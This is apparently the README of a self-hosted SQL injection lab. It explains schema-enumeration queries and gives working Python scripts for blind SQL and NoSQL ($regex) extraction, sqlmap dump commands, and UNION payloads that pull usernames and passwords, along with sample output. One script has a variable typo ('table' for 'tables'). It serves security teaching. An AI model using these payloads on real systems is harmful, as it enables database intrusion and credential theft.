# SQL Injection
## 1. SQL
### 1.1. Overview
- syntax to comment: `--`, `/* */`, ...
- union: 
```
SELECT column_name(s) FROM table1 -> clause 1
UNION
SELECT column_name(s) FROM table2 -> clause 2
```
-> when clause 1 fail, will execute clause 2
- group_concat: string concatenation

### 1.2. Sqlite
- `select sql from sqlite_master`
-> show schema

### 1.3. Mysql
- `select table_name from information_schema.tables where table_schema=database()`
-> show name of tables
- `select column_name from information_schema.columns where table_name=table_name`
-> show columns name of that table

### 1.4. Cheetsheet 
`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection`

## 2. Attack
### 2.1. SQL injection boolean
- injection to query to bypass 

### 2.2. SQL injection blind
- base on response as like as error, timeout to collect data
example:
```
import requests, string

characters = string.printable
s = requests.session()

target = "http://0.0.0.0/api/sqliBlind"

def get_one_char(payload):
    for c in characters:
        response = s.post(target,json = {
            'username' : f"a' or ({payload})={ord(c)}  -- -",
            'password' : 'foo'
            }).json()
        if response['data'] == True:
            return c
    return None

def dump_tables():
    tables = ""
    payload = "select ascii(mid(group_concat(table_name),{index},1)) from information_schema.tables where table_schema=database()"
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        tables, index = table + c , index + 1
        print('[+] table = ',tables)
        c = get_one_char(payload.format(index=index))
    return tables

def dump_columns(table_name):
    columns = ""
    payload = "select ascii(mid(group_concat(column_name),{index},1)) from information_schema.columns where table_name='%s'"%(table_name)
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        columns, index = columns + c, index + 1 
        c = get_one_char(payload.format(index=index))
    return columns

table = dump_tables()

print('\n-----------\n[*] tables found: ', table)

for t in table.split(','):
    print(f'[*] columns of {t} found: ',dump_columns(t))
```

### 2.3. Nosql injection
```
import requests, string
req = requests.session()
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"

def blind(data):
    for char in arr:
        res = req.post('http://0.0.0.0/api/sqliMongo',json={'username':'admin','password':{"$regex": f"^{data}{char}"}}).json()
        if res['data']:
            return char
    return None        

def dump_data():
    data = '' 
    while True:
        char = blind(data)
        if char == "$":
            return data 
        data += char 
        print('[+] password: = ',data)

def detect_sqli():
    res = req.post('http://0.0.0.0/api/sqliMongo',json={'username': {"$ne" : 'a'},'password':  {"$ne" : 'a'} }).json()
    print(res)

print('[+] password found : ',dump_data())

```
### 2.4. Tool sqlmap
- install: `brew install sqlmap`
- use: `sqlmap -u url_victim --batch --current-db` -> get name of database
- use: `sqlmap -u url_victim --batch -D name_db --dump-all ` -> show all data of that database
(`can use file_request to dynamic scan`)



## 3. Step to step exploit this lab
### Prepare to deploy lab
|Command | Uses |
|--------|------|
|make build | build image before deploy lab|
|make up | deploy lab|
|make down | stop lab|
|make logs | show logs|

### 3.1. SQLi Union
- click [me](http://0.0.0.0/sqliUnion.php) to redirect to this lab
- in this lab
![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.39.25.png)
- enter any number to input
![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.54.46.png)
- modify url: `http://0.0.0.0/sqliUnion.php?id=1` to 
`http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,4,5,6` and we see it show 1,2,3,4,5,6
![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.57.45.png)
- now, we can use query show schema in order to get name of table and column
```
select group_concat(table_name) from information_schema.tables where table_schema=database()
select group_concat(column_name) from information_schema.columns where table_name='table_name'
```
- -> `group_concat` function like `join` function in python, strings are concatenated by '`,`'
- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()` to get name of tables
- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='users'` to get name columns of that table, example table: `users`
- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(username),group_concat(passwd),6 from users` to get data of table users

### 3.2. SQLi Blind Boolean
- clike [me](http://0.0.0.0/sqlBlind.html) to redirect this lab
- enter username, password into input like image
![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2015.38.55.png)
- my mindset:
- - use `-- -` to comment any query query, example:
`select username, password from users where username='aa' or 1=1 -- -' and passowrd='a'`
- - get each character in schema and equal it
- - use python to exploit auto with mindset

-  execute command: `python3 tool_exploit/solution.py`
```
admin@Admins-MacBook-Pro 002_sqlinjection % python3 tool_exploit/solution.py
[+] table =  e
[+] table =  em
[+] table =  emp
[+] table =  empl
[+] table =  emplo
[+] table =  employ
[+] table =  employe
[+] table =  employee
[+] table =  employees
[+] table =  employees,
[+] table =  employees,j
[+] table =  employees,jo
[+] table =  employees,job
[+] table =  employees,jobs
[+] table =  employees,jobs,
[+] table =  employees,jobs,u
[+] table =  employees,jobs,us
[+] table =  employees,jobs,use
[+] table =  employees,jobs,user
[+] table =  employees,jobs,users

-----------
[*] tables found:  employees,jobs,users
[*] columns of employees found:  id,name,salary
[*] columns of jobs found:  id,title,salary,location,type,date
[*] columns of users found:  id,username,passwd,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```